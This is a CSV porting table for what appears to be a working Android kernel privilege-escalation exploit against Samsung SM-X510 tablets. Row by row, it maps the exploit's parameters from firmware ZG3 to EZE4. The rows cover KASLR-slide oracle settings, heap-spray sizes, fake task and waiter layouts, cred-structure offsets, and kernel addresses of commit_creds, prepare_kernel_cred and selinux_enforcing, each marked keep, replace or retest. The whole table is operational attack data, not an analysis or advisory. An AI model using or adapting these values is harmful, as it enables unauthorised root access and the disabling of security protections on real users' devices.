"NAME","ZG3_VALUE","EZE4_VALUE","CATEGORY","EVIDENCE","STATUS","ACTION"
"OFFSET_H","","N/A","UNKNOWN","C include guard; not a target parameter","NOT_APPLICABLE","REMOVE"
"BUILD_VARIANT_LABEL","""gts9fewifi-X510XXSEEZG3-app""","""gts9fewifi-X510XXUCEZE4-app"" (provisional)","BUILD_METADATA","EZE4 firmware identity is confirmed; label spelling is a draft convention","UNRESOLVED","REPLACE"
"PHYS_P0_ORACLE","1","1 (route retained, collision coverage unresolved)","EXPLOIT_ALGORITHM_CONSTANT","ZG3 target.h; docs/rmg-eze4/PHASE3B.md; p0_collision_analysis.md","UNRESOLVED","INVESTIGATE"
"SLIDE_ROUTE","SLIDE_ROUTE_FPSIMD","SLIDE_ROUTE_FPSIMD (static compatibility only)","EXPLOIT_ALGORITHM_CONSTANT","docs/rmg-eze4/fpsimd_static_analysis.md; no EZE4 runtime validation","EMPIRICAL_RETEST_REQUIRED","RETEST"
"BUILD_FINGERPRINT","""samsung/gts9fewifixx/gts9fewifi:16/BP4A.251205.006/X510XXSEEZG3:user/release-keys""","samsung/gts9fewifixx/gts9fewifi:16/BP4A.251205.006/X510XXUCEZE4:user/release-keys (expected; exact property not retained)","FIRMWARE_FINGERPRINT","configs/target-sm-x510.env; docs/10-unidad-x510-eze4.md; exact ro.build.fingerprint absent","UNRESOLVED","INVESTIGATE"
"MM_STRUCT_SZ","0x400","0x400 allocation bucket (sizeof(mm_struct)=0x3e0)","EXPLOIT_ALGORITHM_CONSTANT","docs/rmg-eze4/eze4_struct_layout.csv; PHASE2B_ERRATA2.md","CONFIRMED_IDENTICAL","KEEP"
"KMALLOC_CGROUP_TYPE","1","1","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"KMALLOC_CACHE_TYPES","3","3","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS","2","2","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"FOPS_KERNEL_PAGE_SETUP_ATTEMPTS","2","2","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"FOPS_ROUTE_COARSE_DELAY_USEC","50000","50000","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"FOPS_ROUTE_FINE_DELAY_TICKS","0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL","0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"PRODUCTION_STACK_PI_RIGHT_ONLY","0","0","EXPLOIT_ALGORITHM_CONSTANT","docs/rmg-eze4/zg3_target_inventory_v2.csv; ZG3 target.h:31","CONFIRMED_IDENTICAL","KEEP"
"DEFAULT_EXPLOIT_ATTEMPTS","8","8","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"DEFAULT_ATTEMPT_TIMEOUT_SEC","2200","2200","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"DEFAULT_P0_ATTEMPT_TIMEOUT_SEC","1200","1200","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"KIMAGE_TEXT_BASE","0xffffffc008000000ULL","0xffffffc008000000ULL","KERNEL_MEMORY_LAYOUT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"P0_PAGE_OFFSET","0xffffff8000000000ULL","0xffffff8000000000ULL","KERNEL_MEMORY_LAYOUT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"P0_PHYS_OFFSET","0x80000000ULL","0x80000000ULL","SOC_CONSTANT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"P0_KERNEL_PHYS_LOAD","0x80000000ULL","0x80000000ULL","SOC_CONSTANT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"KERNELSNITCH_IDENTITY_END","0xffffff9000000000ULL","0xffffff9000000000ULL","KERNEL_MEMORY_LAYOUT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"DIRECT_MAP_BASE","0xffffff8000000000ULL","0xffffff8000000000ULL","KERNEL_MEMORY_LAYOUT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"DIRECT_MAP_END","0xffffff9000000000ULL","0xffffff9000000000ULL","KERNEL_MEMORY_LAYOUT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"VMEMMAP_START","0xfffffffe00000000ULL","0xfffffffe00000000ULL","KERNEL_MEMORY_LAYOUT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"P0_ORACLE_GATE_SLOT","0","0","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"P0_ORACLE_PROBE_SLOT","1","1","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"P0_ORACLE_GATE_RESTORE_SLOT","2","2","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"P0_ORACLE_PROBE_RESTORE_SLOT","3","3","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"P0_ORACLE_GATE_PAGE_OFF","0x0e80","0x0e80","PAYLOAD_SYNTHETIC_LAYOUT","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"P0_ORACLE_GATE_OBJECT_INDEX","1","1","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"P0_ORACLE_PROBE_OFFSET","0x1f0000ULL","0x1f0000ULL","KERNEL_MEMORY_LAYOUT","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"P0_FINGERPRINT_HEADER","""targets/gts9fewifi-X510XXSEEZG3/p0_fingerprint.h""","""targets/gts9fewifi-X510XXUCEZE4/p0_fingerprint.h"" (future draft path)","BUILD_METADATA","Firmware-specific include path; no EZE4 production target exists","CONFIRMED_CHANGED","REPLACE"
"P0_FINGERPRINT_MIN_BEST","5","5","EXPLOIT_ALGORITHM_CONSTANT","ZG3 oracle.c thresholds; EZE4 PHASE3B shows four low-margin/rejected slides","EMPIRICAL_RETEST_REQUIRED","RETEST"
"P0_FINGERPRINT_MIN_MARGIN","3","3","EXPLOIT_ALGORITHM_CONSTANT","ZG3 oracle.c thresholds; EZE4 PHASE3B shows four low-margin/rejected slides","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_P0_OFFSET_CANDIDATES","0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, 0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, 0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, 0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, 0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, 0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, 0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, 0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL","N/A in PHYS_P0_ORACLE=1 build","RUNTIME_TUNING","ZG3 slide_app.c compile-time guard excludes legacy 32-candidate array; PHASE3A_ERRATA.md","NOT_APPLICABLE","REMOVE"
"SLIDE_MAX_ATTEMPTS","32","32","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_KASLR_STEP","0x4000ULL","0x4000ULL","KERNEL_MEMORY_LAYOUT","EZE4 config/source and docs/rmg-eze4/PHASE2B.md","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_TRACEFS_EVENT_ID","108","108","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_TRACEFS_WORKER_CALLER_OFF","0x00108668ULL","0x00108668ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_FAKE_WAITER_PRIO","0","0","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_WAIT_NSEC","2000000000L","2000000000L","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_REQUEUE_ARM_USEC","20000","20000","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_USE_FAKE_TASK","1","1","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"COMPACT_RT_MUTEX_WAITER","1","1","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_RB_PARENT_TYPE_RESTORE","1ULL","1ULL","EXPLOIT_ALGORITHM_CONSTANT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_KSNITCH_APPENDED_FUTEXES","2048","2048","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_KSNITCH_REPEAT_MEASUREMENT","64","64","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_KSNITCH_AVERAGE","8","8","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_KSNITCH_SCREEN_REPEAT","16","16","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_KSNITCH_SCREEN_AVERAGE","3","3","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_BANK_SLOTS","4","4","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_BANK_TASK_OFF","0x1000","0x1000","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_BANK_TASK_STRIDE","0x1c0","0x1c0","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_BANK_LOCK_OFF","0x5200","0x5200","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_BANK_SLOT_STRIDE","0x100","0x100","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_BANK_WAITER_OFF","0x40","0x40","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"SKB_SEND_SIZE","0x8e80","0x8e80","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SKB_RECLAIM_SENDS","64","64","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"SLIDE_RECLAIM_SENDS","64","64","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"TASK_STRUCT_CRED_OFF","0x798ULL","0x798ULL","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"TASK_STRUCT_REAL_CRED_OFF","0x790ULL","0x790ULL","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"FAKE_TASK_TASK_GROUP_OFF","0x400ULL","0x400ULL","KERNEL_STRUCT_MEMBER","docs/rmg-eze4/eze4_struct_layout.csv; BTF/DWARF; 53/53 relevant structural parameters match","CONFIRMED_IDENTICAL","KEEP"
"ROOT_UMH_PATH","""/data/local/tmp/cve-2026-43499-root""","""/data/local/tmp/cve-2026-43499-root""","RUNTIME_TUNING","ZG3 empirical value only; no EZE4 runtime evidence","EMPIRICAL_RETEST_REQUIRED","RETEST"
"ROOT_UMH_WORK_OFF","0x7800","0x7800","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"ROOT_UMH_DATA_OFF","0x7a00","0x7a00","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"INIT_TASK_OFF","0x0239fd80ULL","0x0239fd80ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"PREPARE_KERNEL_CRED_OFF","0x00113a88ULL","0x00113a88ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"COMMIT_CREDS_OFF","0x00113330ULL","0x00113330ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"OVERRIDE_CREDS_OFF","0x00113718ULL","0x00113718ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ROOT_TASK_GROUP_OFF","0x02591f40ULL","0x02591f40ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SELINUX_ENFORCING_OFF","0x026654e8ULL","0x026654e8ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"KMALLOC_CACHES_OFF","0x01b04c70ULL","0x01b04bb0ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_CHANGED","REPLACE"
"ANON_PIPE_BUF_OPS_OFF","0x01912de0ULL","0x01912d20ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_CHANGED","REPLACE"
"SYSTEM_UNBOUND_WQ_OFF","0x0238ae20ULL","0x0238ae20ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"CALL_USERMODEHELPER_EXEC_WORK_OFF","0x00100eecULL","0x00100eecULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_FOPS_OFF","0x01ab3c08ULL","0x01ab3b48ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_CHANGED","REPLACE"
"ASHMEM_MISC_FOPS_OFF","0x024ff750ULL","0x024ff750ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_IOCTL_OFF","0x00d026c0ULL","0x00d026c0ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_COMPAT_IOCTL_OFF","0x00d02c78ULL","0x00d02c78ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_MMAP_OFF","0x00d02cd0ULL","0x00d02cd0ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_OPEN_OFF","0x00d02f0cULL","0x00d02f0cULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_RELEASE_OFF","0x00d02f90ULL","0x00d02f90ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_SHOW_FDINFO_OFF","0x00d030b0ULL","0x00d030b0ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"CONFIGFS_READ_ITER_OFF","0x004759c4ULL","0x004759c4ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"CONFIGFS_BIN_WRITE_ITER_OFF","0x00475e80ULL","0x00475e80ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"COPY_SPLICE_READ_OFF","0x003fcb5cULL","0x003fcb5cULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"NOOP_LLSEEK_OFF","0x003b1d24ULL","0x003b1d24ULL","KERNEL_TEXT_OFFSET","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_NFULNL_LOGGER_NAME_OFF","0x017fdc14ULL","0x017fdb3cULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_CHANGED","REPLACE"
"SLIDE_NFULNL_LOGGER_OBJECT_OFF","0x023925a0ULL","0x023925a0ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF","0x024be6f8ULL","0x024be6f8ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_INIT_TASK_OFF","INIT_TASK_OFF","0x0239fd80ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_ROOT_TASK_GROUP_OFF","ROOT_TASK_GROUP_OFF","0x02591f40ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_SYSCTL_BOOTID_OFF","0x0274a5c9ULL","0x0274a5c9ULL","KERNEL_DATA_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"INIT_TASK","(KIMAGE_TEXT_BASE + INIT_TASK_OFF)","0xffffffc00a39fd80","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ROOT_TASK_GROUP","(KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)","0xffffffc00a591f40","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SELINUX_ENFORCING","(KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)","0xffffffc00a6654e8","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"KMALLOC_CACHES","(KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)","0xffffffc009b04bb0","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_CHANGED","REPLACE"
"ANON_PIPE_BUF_OPS","(KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)","0xffffffc009912d20","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_CHANGED","REPLACE"
"SYSTEM_UNBOUND_WQ","(KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)","0xffffffc00a38ae20","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"CALL_USERMODEHELPER_EXEC_WORK","(KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)","0xffffffc008100eec","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_MISC_FOPS","(KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)","0xffffffc00a4ff750","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_FOPS","(KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)","0xffffffc009ab3b48","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_CHANGED","REPLACE"
"ASHMEM_IOCTL","(KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)","0xffffffc008d026c0","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_COMPAT_IOCTL","(KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)","0xffffffc008d02c78","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_MMAP","(KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)","0xffffffc008d02cd0","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_OPEN","(KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)","0xffffffc008d02f0c","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_RELEASE","(KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)","0xffffffc008d02f90","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"ASHMEM_SHOW_FDINFO","(KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)","0xffffffc008d030b0","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"CONFIGFS_READ_ITER","(KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)","0xffffffc0084759c4","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"CONFIGFS_BIN_WRITE_ITER","(KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)","0xffffffc008475e80","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"COPY_SPLICE_READ","(KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)","0xffffffc0083fcb5c","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"NOOP_LLSEEK","(KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)","0xffffffc0083b1d24","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_NFULNL_LOGGER_NAME_IMAGE","(KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)","0xffffffc0097fdb3c","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_CHANGED","REPLACE"
"SLIDE_NFULNL_LOGGER_OBJECT_IMAGE","(KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)","0xffffffc00a3925a0","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE","(KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)","0xffffffc00a4be6f8","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_INIT_TASK_IMAGE","(KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)","0xffffffc00a39fd80","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_PATTERN; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_ROOT_TASK_GROUP_IMAGE","(KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)","0xffffffc00a591f40","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"SLIDE_SYSCTL_BOOTID_IMAGE","(KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)","0xffffffc00a74a5c9","KERNEL_SYMBOL","docs/rmg-eze4/eze4_symbol_map.csv: ABSOLUTE_DISASSEMBLY; Image.stock","CONFIRMED_IDENTICAL","KEEP"
"LOCK_OFF","0x2210","0x2210","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
"W0_OFF","0x2350","0x2350","PAYLOAD_SYNTHETIC_LAYOUT","Payload-owned layout/algorithm constant; independent of firmware binary layout","CONFIRMED_IDENTICAL","KEEP"
